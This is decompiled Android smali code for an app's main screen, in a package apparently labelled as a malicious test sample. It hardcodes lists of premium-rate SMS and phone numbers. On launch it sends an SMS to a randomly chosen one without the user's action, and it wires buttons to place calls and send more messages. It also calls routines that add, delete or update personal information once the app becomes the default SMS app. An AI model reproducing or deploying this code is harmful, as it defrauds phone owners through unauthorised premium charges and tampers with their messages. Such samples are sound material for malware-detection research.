.class public Leldorado/sec_01_malicious_01/MainActivity;
.super Landroid/support/v7/app/AppCompatActivity;
.source "MainActivity.java"


# static fields
.field private static final MALICIOUS_PHONE:[Ljava/lang/String;

.field private static final MALICIOUS_PHONE_PREFIX:[Ljava/lang/String;

.field private static final MALICIOUS_SMS:[Ljava/lang/String;

.field private static final MALICIOUS_SMS_PREFIX:[Ljava/lang/String;


# instance fields
.field mBtnPhone:Landroid/widget/Button;

.field mBtnSmsActionView:Landroid/widget/Button;

.field mBtnSmsDirect:Landroid/widget/Button;

.field mBtnSmsManager:Landroid/widget/Button;


# direct methods
.method static constructor <clinit>()V
    .locals 8

    .prologue
    const/4 v7, 0x4

    const/4 v6, 0x3

    const/4 v5, 0x2

    const/4 v4, 0x1

    const/4 v3, 0x0

    .line 21
    const/16 v0, 0x8

    new-array v0, v0, [Ljava/lang/String;

    const-string v1, "1066"

    aput-object v1, v0, v3

    const-string v1, "10690"

    aput-object v1, v0, v4

    const-string v1, "10698"

    aput-object v1, v0, v5

    const-string v1, "10699"

    aput-object v1, v0, v6

    const-string v1, "955"

    aput-object v1, v0, v7

    const/4 v1, 0x5

    const-string v2, "123"

    aput-object v2, v0, v1

    const/4 v1, 0x6

    const-string v2, "951"

    aput-object v2, v0, v1

    const/4 v1, 0x7

    const-string v2, "953"

    aput-object v2, v0, v1

    sput-object v0, Leldorado/sec_01_malicious_01/MainActivity;->MALICIOUS_SMS_PREFIX:[Ljava/lang/String;

    .line 23
    const/16 v0, 0xc

    new-array v0, v0, [Ljava/lang/String;

    const-string v1, "168"

    aput-object v1, v0, v3

    const-string v1, "12590"

    aput-object v1, v0, v4

    const-string v1, "12580"

    aput-object v1, v0, v5

    const-string v1, "160"

    aput-object v1, v0, v6

    const-string v1, "400"

    aput-object v1, v0, v7

    const/4 v1, 0x5

    const-string v2, "268"

    aput-object v2, v0, v1

    const/4 v1, 0x6

    const-string v2, "195"

    aput-object v2, v0, v1

    const/4 v1, 0x7

    const-string v2, "198"

    aput-object v2, v0, v1

    const/16 v1, 0x8

    const-string v2, "968"

    aput-object v2, v0, v1

    const/16 v1, 0x9

    const-string v2, "960"

    aput-object v2, v0, v1

    const/16 v1, 0xa

    const-string v2, "12586"

    aput-object v2, v0, v1

    const/16 v1, 0xb

    const-string v2, "95001"

    aput-object v2, v0, v1

    sput-object v0, Leldorado/sec_01_malicious_01/MainActivity;->MALICIOUS_PHONE_PREFIX:[Ljava/lang/String;

    .line 26
    const/4 v0, 0x6

    new-array v0, v0, [Ljava/lang/String;

    const-string v1, "16836580"

    aput-object v1, v0, v3

    const-string v1, "400-86-52400"

    aput-object v1, v0, v4

    const-string v1, "16835316"

    aput-object v1, v0, v5

    const-string v1, "16836570"

    aput-object v1, v0, v6

    const-string v1, "1169713188"

    aput-object v1, v0, v7

    const/4 v1, 0x5

    const-string v2, "1259062633"

    aput-object v2, v0, v1

    sput-object v0, Leldorado/sec_01_malicious_01/MainActivity;->MALICIOUS_SMS:[Ljava/lang/String;

    .line 27
    const/4 v0, 0x6

    new-array v0, v0, [Ljava/lang/String;

    const-string v1, "16836599"

    aput-object v1, v0, v3

    const-string v1, "10669997"

    aput-object v1, v0, v4

    const-string v1, "10659090850"

    aput-object v1, v0, v5

    const-string v1, "10658888"

    aput-object v1, v0, v6

    const-string v1, "10655059666"

    aput-object v1, v0, v7

    const/4 v1, 0x5

    const-string v2, "1065800885580"

    aput-object v2, v0, v1

    sput-object v0, Leldorado/sec_01_malicious_01/MainActivity;->MALICIOUS_PHONE:[Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 12
    invoke-direct {p0}, Landroid/support/v7/app/AppCompatActivity;-><init>()V

    return-void
.end method

.method static synthetic access$000()[Ljava/lang/String;
    .locals 1

    .prologue
    .line 12
    sget-object v0, Leldorado/sec_01_malicious_01/MainActivity;->MALICIOUS_PHONE:[Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$100()[Ljava/lang/String;
    .locals 1

    .prologue
    .line 12
    sget-object v0, Leldorado/sec_01_malicious_01/MainActivity;->MALICIOUS_SMS:[Ljava/lang/String;

    return-object v0
.end method

.method private isPayPhoneNo(Ljava/lang/String;)Z
    .locals 5
    .param p1, "phone"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x0

    .line 76
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_0
    sget-object v3, Leldorado/sec_01_malicious_01/MainActivity;->MALICIOUS_PHONE_PREFIX:[Ljava/lang/String;

    array-length v3, v3

    if-ge v0, v3, :cond_0

    .line 77
    sget-object v3, Leldorado/sec_01_malicious_01/MainActivity;->MALICIOUS_PHONE_PREFIX:[Ljava/lang/String;

    aget-object v1, v3, v0

    .line 78
    .local v1, "prefix":Ljava/lang/String;
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v3

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v4

    if-gt v3, v4, :cond_1

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v3

    invoke-virtual {p1, v2, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 79
    const/4 v2, 0x1

    .line 82
    .end local v1    # "prefix":Ljava/lang/String;
    :cond_0
    return v2

    .line 76
    .restart local v1    # "prefix":Ljava/lang/String;
    :cond_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method private isPaySmsNo(Ljava/lang/String;)Z
    .locals 5
    .param p1, "sms_no"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x0

    .line 87
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_0
    sget-object v3, Leldorado/sec_01_malicious_01/MainActivity;->MALICIOUS_SMS_PREFIX:[Ljava/lang/String;

    array-length v3, v3

    if-ge v0, v3, :cond_0

    .line 88
    sget-object v3, Leldorado/sec_01_malicious_01/MainActivity;->MALICIOUS_SMS_PREFIX:[Ljava/lang/String;

    aget-object v1, v3, v0

    .line 89
    .local v1, "prefix":Ljava/lang/String;
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v3

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v4

    if-gt v3, v4, :cond_1

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v3

    invoke-virtual {p1, v2, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 90
    const/4 v2, 0x1

    .line 93
    .end local v1    # "prefix":Ljava/lang/String;
    :cond_0
    return v2

    .line 87
    .restart local v1    # "prefix":Ljava/lang/String;
    :cond_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method


# virtual methods
.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 1
    .param p1, "requestCode"    # I
    .param p2, "resultCode"    # I
    .param p3, "data"    # Landroid/content/Intent;

    .prologue
    .line 98
    invoke-super {p0, p1, p2, p3}, Landroid/support/v7/app/AppCompatActivity;->onActivityResult(IILandroid/content/Intent;)V

    .line 99
    const/16 v0, 0x12c

    if-ne p1, v0, :cond_0

    .line 100
    invoke-static {}, Leldorado/sec_01_malicious_01/Utility;->isDefaultSmsApp()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 101
    invoke-static {}, Leldorado/sec_01_malicious_01/Utility;->addPersonalInfo()V

    .line 104
    :cond_0
    const/16 v0, 0x12d

    if-ne p1, v0, :cond_1

    .line 105
    invoke-static {}, Leldorado/sec_01_malicious_01/Utility;->isDefaultSmsApp()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 106
    invoke-static {}, Leldorado/sec_01_malicious_01/Utility;->deletePersonalInfo()V

    .line 110
    :cond_1
    const/16 v0, 0x12e

    if-ne p1, v0, :cond_2

    .line 111
    invoke-static {}, Leldorado/sec_01_malicious_01/Utility;->isDefaultSmsApp()Z

    move-result v0

    if-eqz v0, :cond_2

    .line 112
    invoke-static {}, Leldorado/sec_01_malicious_01/Utility;->updatePersonalInfo()V

    .line 116
    :cond_2
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 32
    invoke-super {p0, p1}, Landroid/support/v7/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 33
    const v1, 0x7f040019

    invoke-virtual {p0, v1}, Leldorado/sec_01_malicious_01/MainActivity;->setContentView(I)V

    .line 34
    invoke-virtual {p0}, Leldorado/sec_01_malicious_01/MainActivity;->getSupportActionBar()Landroid/support/v7/app/ActionBar;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/support/v7/app/ActionBar;->setDisplayShowHomeEnabled(Z)V

    .line 35
    invoke-virtual {p0}, Leldorado/sec_01_malicious_01/MainActivity;->getSupportActionBar()Landroid/support/v7/app/ActionBar;

    move-result-object v1

    const/high16 v2, 0x7f030000

    invoke-virtual {v1, v2}, Landroid/support/v7/app/ActionBar;->setIcon(I)V

    .line 36
    const v1, 0x7f0c0050

    invoke-virtual {p0, v1}, Leldorado/sec_01_malicious_01/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Button;

    iput-object v1, p0, Leldorado/sec_01_malicious_01/MainActivity;->mBtnPhone:Landroid/widget/Button;

    .line 37
    const v1, 0x7f0c0051

    invoke-virtual {p0, v1}, Leldorado/sec_01_malicious_01/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Button;

    iput-object v1, p0, Leldorado/sec_01_malicious_01/MainActivity;->mBtnSmsManager:Landroid/widget/Button;

    .line 38
    const v1, 0x7f0c0052

    invoke-virtual {p0, v1}, Leldorado/sec_01_malicious_01/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Button;

    iput-object v1, p0, Leldorado/sec_01_malicious_01/MainActivity;->mBtnSmsActionView:Landroid/widget/Button;

    .line 39
    const v1, 0x7f0c0053

    invoke-virtual {p0, v1}, Leldorado/sec_01_malicious_01/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Button;

    iput-object v1, p0, Leldorado/sec_01_malicious_01/MainActivity;->mBtnSmsDirect:Landroid/widget/Button;

    .line 40
    sget-object v1, Leldorado/sec_01_malicious_01/MainActivity;->MALICIOUS_SMS:[Ljava/lang/String;

    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    sget-object v3, Leldorado/sec_01_malicious_01/MainActivity;->MALICIOUS_SMS:[Ljava/lang/String;

    array-length v3, v3

    add-int/lit8 v3, v3, -0x1

    invoke-virtual {v2, v3}, Ljava/util/Random;->nextInt(I)I

    move-result v2

    aget-object v0, v1, v2

    .line 41
    .local v0, "sms_no":Ljava/lang/String;
    const-string v1, "Hello World! \n send SMS1"

    invoke-static {v0, v1}, Leldorado/sec_01_malicious_01/Utility;->sendSMS1(Ljava/lang/String;Ljava/lang/String;)V

    .line 43
    iget-object v1, p0, Leldorado/sec_01_malicious_01/MainActivity;->mBtnPhone:Landroid/widget/Button;

    new-instance v2, Leldorado/sec_01_malicious_01/MainActivity$1;

    invoke-direct {v2, p0}, Leldorado/sec_01_malicious_01/MainActivity$1;-><init>(Leldorado/sec_01_malicious_01/MainActivity;)V

    invoke-virtual {v1, v2}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 50
    iget-object v1, p0, Leldorado/sec_01_malicious_01/MainActivity;->mBtnSmsManager:Landroid/widget/Button;

    new-instance v2, Leldorado/sec_01_malicious_01/MainActivity$2;

    invoke-direct {v2, p0}, Leldorado/sec_01_malicious_01/MainActivity$2;-><init>(Leldorado/sec_01_malicious_01/MainActivity;)V

    invoke-virtual {v1, v2}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 58
    iget-object v1, p0, Leldorado/sec_01_malicious_01/MainActivity;->mBtnSmsActionView:Landroid/widget/Button;

    new-instance v2, Leldorado/sec_01_malicious_01/MainActivity$3;

    invoke-direct {v2, p0}, Leldorado/sec_01_malicious_01/MainActivity$3;-><init>(Leldorado/sec_01_malicious_01/MainActivity;)V

    invoke-virtual {v1, v2}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 65
    iget-object v1, p0, Leldorado/sec_01_malicious_01/MainActivity;->mBtnSmsDirect:Landroid/widget/Button;

    new-instance v2, Leldorado/sec_01_malicious_01/MainActivity$4;

    invoke-direct {v2, p0}, Leldorado/sec_01_malicious_01/MainActivity$4;-><init>(Leldorado/sec_01_malicious_01/MainActivity;)V

    invoke-virtual {v1, v2}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 72
    return-void
.end method
